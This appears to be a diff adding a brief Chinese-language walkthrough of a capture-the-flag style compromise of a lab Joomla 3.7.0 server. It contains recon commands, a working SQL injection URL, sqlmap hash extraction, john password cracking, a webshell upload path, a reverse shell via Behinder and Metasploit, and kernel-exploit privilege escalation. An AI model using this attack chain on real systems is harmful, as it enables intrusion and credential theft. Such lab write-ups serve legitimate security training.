@@ -1,0 +1,64 @@
+nmap -sV 192.168.140.0/24
+进行主机ip探测
+
+
+进行主机信息和端口探测
+nmap -sV 192.168.140.0/24
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: Joomla! - Open Source Content Management
+|_http-title: Home
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+开了80端口
+
+
+目录扫描出来了CMS后台登录界面 joolma
+dirb http://192.168.140.135  
+
+http://192.168.140.135/administrator/ 
+进入后点击账户，发现记录了三个账户，尝试爆破失败
+administhebest
+kobe
+fs
+
+通过网站查找发现
+这里有sql注入漏洞
+http://192.168.140.135:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,database()),1)
+joomladb
+
+查看漏洞版本
+searchsploit joomla 3.7.0
+进入相应目录查看漏洞利用方法和信息
+
+通过searchspolit 能够查到相应的漏洞和EXP
+sqlmap进行注入获取用户名和密码
+admin | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin
+
+
+使用john进行hash破解
+john --wordlist=/usr/share/john/password.lst 2.txt
+admin:snoopy
+
+登录网站
+
+后台寻找上传点，上传webshell
+冰蝎连接
+http://192.168.140.135/templates/beez3/shell.php
+
+利用冰蝎进行反弹shell,根据冰蝎提示结合msf获得shell
+
+获得的用户权限很低，需要提权
+这时候利用的是ubuntu的漏洞
+
+查看操作系统信息
+cat /proc/version
+cat /etc/issue
+
+利用searchsploit 查找相应的ubuntu内核漏洞
+对漏洞进行下载利用
+
+searchsploit -x 查看漏洞信息
+按照漏洞信息提示，对漏洞进行利用提权，获得root权限
+结束
+
